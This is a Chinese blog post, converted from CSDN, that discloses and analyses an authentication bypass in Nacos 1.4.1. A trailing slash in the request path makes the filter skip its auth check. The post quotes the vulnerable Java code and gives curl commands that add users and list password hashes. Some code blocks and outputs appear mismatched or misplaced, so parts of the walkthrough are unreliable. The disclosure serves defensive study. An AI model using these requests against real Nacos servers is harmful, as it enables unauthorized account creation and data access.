> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/u012921921/article/details/112769864)

你好，我发现 nacos 最新版本 1.4.1 对于 User-Agent 绕过安全漏洞的 serverIdentity key-value 修复机制，依然存在绕过问题，在 nacos 开启了 serverIdentity 的自定义 key-value 鉴权后，通过特殊的 url 构造，依然能绕过限制访问任何 http 接口。

通过查看该功能，需要在 application.properties 添加配置`nacos.core.auth.enable.userAgentAuthWhite:false`，才能避免`User-Agent: Nacos-Server`绕过鉴权的安全问题。

但在开启该机制后，我从代码中发现，任然可以在某种情况下绕过，使之失效，调用任何接口，通过该漏洞，我可以绕过鉴权，做到：

调用添加用户接口，添加新用户（`POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test`）, 然后使用新添加的用户登录 console，访问、修改、添加数据。

### 一、漏洞详情

问题主要出现在`com.alibaba.nacos.core.auth.AuthFilter#doFilter`:

```
public class AuthFilter implements Filter {
    
    @Autowired
    private AuthConfigs authConfigs;
    
    @Autowired
    private AuthManager authManager;
    
    @Autowired
    private ControllerMethodsCache methodsCache;
    
    private Map<Class<? extends ResourceParser>, ResourceParser> parserInstance = new ConcurrentHashMap<>();
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        
        if (!authConfigs.isAuthEnabled()) {
            chain.doFilter(request, response);
            return;
        }
        
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        
        if (authConfigs.isEnableUserAgentAuthWhite()) {
            String userAgent = WebUtils.getUserAgent(req);
            if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) {
                chain.doFilter(request, response);
                return;
            }
        } else if (StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils
                .isNotBlank(authConfigs.getServerIdentityValue())) {
            String serverIdentity = req.getHeader(authConfigs.getServerIdentityKey());
            if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
                chain.doFilter(request, response);
                return;
            }
            Loggers.AUTH.warn("Invalid server identity value for {} from {}", authConfigs.getServerIdentityKey(),
                    req.getRemoteHost());
        } else {
            resp.sendError(HttpServletResponse.SC_FORBIDDEN,
                    "Invalid server identity key or value, Please make sure set `nacos.core.auth.server.identity.key`"
                            + " and `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`");
            return;
        }
        
        try {
            
            Method method = methodsCache.getMethod(req);
            
            if (method == null) {
                chain.doFilter(request, response);
                return;
            }
            
            ...鉴权代码
            
        }
        ...
    }
    ...
}
```

可以看到，上面三个 if else 分支：

*   第一个是`authConfigs.isEnableUserAgentAuthWhite()`，它默认值为 true，当值为 true 时，会判断请求头 User-Agent 是否匹配`User-Agent: Nacos-Server`，若匹配，则跳过后续所有逻辑，执行`chain.doFilter(request, response);`
    
*   第二个是`StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils.isNotBlank(authConfigs.getServerIdentityValue())`，也就是 nacos 1.4.1 版本对于`User-Agent: Nacos-Server`安全问题的简单修复
    
*   第三个是，当前面两个条件都不符合时，对请求直接作出拒绝访问的响应
    

问题出现在第二个分支，可以看到，当 nacos 的开发者在 application.properties 添加配置`nacos.core.auth.enable.userAgentAuthWhite:false`，开启该 key-value 简单鉴权机制后，会根据开发者配置的`nacos.core.auth.server.identity.key`去 http header 中获取一个 value，去跟开发者配置的`nacos.core.auth.server.identity.value`进行匹配，若不匹配，则不进入分支执行：

```
if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
    chain.doFilter(request, response);
    return;
}
```

但问题恰恰就出在这里，这里的逻辑理应是在不匹配时，直接返回拒绝访问，而实际上并没有这样做，这就让我们后续去绕过提供了条件。

再往下看，代码来到：

```
Method method = methodsCache.getMethod(req);
            
if (method == null) {
    chain.doFilter(request, response);
    return;
}
 
...鉴权代码
```

可以看到，这里有一个判断`method == null`，只要满足这个条件，就不会走到后续的鉴权代码。

通过查看`methodsCache.getMethod(req)`代码实现，我发现了一个方法，可以使之返回的 method 为 null

com.alibaba.nacos.core.code.ControllerMethodsCache#getMethod

```
public Method getMethod(HttpServletRequest request) {
    String path = getPath(request);
    if (path == null) {
        return null;
    }
    String httpMethod = request.getMethod();
    String urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), "");
    List<RequestMappingInfo> requestMappingInfos = urlLookup.get(urlKey);
    if (CollectionUtils.isEmpty(requestMappingInfos)) {
        return null;
    }
    List<RequestMappingInfo> matchedInfo = findMatchedInfo(requestMappingInfos, request);
    if (CollectionUtils.isEmpty(matchedInfo)) {
        return null;
    }
    RequestMappingInfo bestMatch = matchedInfo.get(0);
    if (matchedInfo.size() > 1) {
        RequestMappingInfoComparator comparator = new RequestMappingInfoComparator();
        matchedInfo.sort(comparator);
        bestMatch = matchedInfo.get(0);
        RequestMappingInfo secondBestMatch = matchedInfo.get(1);
        if (comparator.compare(bestMatch, secondBestMatch) == 0) {
            throw new IllegalStateException(
                    "Ambiguous methods mapped for '" + request.getRequestURI() + "': {" + bestMatch + ", "
                            + secondBestMatch + "}");
        }
    }
    return methods.get(bestMatch);
}
```

```
private String getPath(HttpServletRequest request) {
    String path = null;
    try {
        path = new URI(request.getRequestURI()).getPath();
    } catch (URISyntaxException e) {
        LOGGER.error("parse request to path error", e);
    }
    return path;
}
```

这个代码里面，可以很明确的看到，method 值的返回，取决于

```
String urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), "");
List<RequestMappingInfo> requestMappingInfos = urlLookup.get(urlKey);
```

urlKey 这个 key，是否能从 urlLookup 这个 ConcurrentHashMap 中获取到映射值

而 urlKey 的组成中，存在着 path 这一部分，而这一部分的生成，恰恰存在着问题，它是通过如下方式获得的：

```
{
    "totalCount": 1,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        }
    ]
}
```

一个正常的访问，比如`curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test'`，得到的 path 将会是`/nacos/v1/auth/users`，而通过特殊构造的 url，比如`curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users/?username=test&password=test' --path-as-is`，得到的 path 将会是`/nacos/v1/auth/users/`

通过该方式，将能控制该 path 多一个末尾的斜杆'/'，导致从 urlLookup 这个 ConcurrentHashMap 中获取不到 method，为什么呢，因为 nacos 基本全部的 RequestMapping 都没有以斜杆'/'结尾，只有非斜杆'/'结尾的 RequestMapping 存在并存入了 urlLookup 这个 ConcurrentHashMap，那么，最外层的`method == null`条件将能满足，从而，绕过该鉴权机制。

### 二、漏洞影响范围

影响范围：  
1.4.1

### 三、漏洞复现

1. 访问用户列表接口

```
{
    "code":200,
    "message":"create user ok!",
    "data":null
}
```

可以看到，绕过了鉴权，返回了用户列表数据

```
{
    "totalCount": 2,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        },
        {
            "username": "test",
            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
        }
    ]
}
```

  2. 添加新用户

```
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test'
```

可以看到，绕过了鉴权，添加了新用户

```
{
    "code":200,
    "message":"create user ok!",
    "data":null
}
```

3. 再次查看用户列表

```
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
```

可以看到，返回的用户列表数据中，多了一个我们通过绕过鉴权创建的新用户

```
{
    "totalCount": 2,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        },
        {
            "username": "test",
            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
        }
    ]
}
```

4. 访问首页`http://127.0.0.1:8848/nacos/`，登录新账号，可以做任何事情